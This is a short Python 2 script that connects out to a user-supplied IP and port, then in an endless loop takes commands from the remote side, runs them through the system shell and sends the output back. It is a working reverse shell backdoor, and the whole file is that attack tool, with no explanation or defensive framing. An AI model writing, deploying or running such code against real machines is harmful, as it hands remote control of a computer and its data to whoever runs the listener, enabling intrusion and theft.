import socket
import subprocess

def execute_system_command(command):
    return subprocess.check_output(command,shell=True)

connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)   #(family,type)
ip=raw_input("Enter the host ip: ")
port=int(input("Enter the port: "))
connection.connect((ip,port))
connection.send("\n[+] Connection established.\n")
while True:
    command=connection.recv(1024)
    command_result=execute_system_command(command)
    connection.send(command_result)

connection.close()
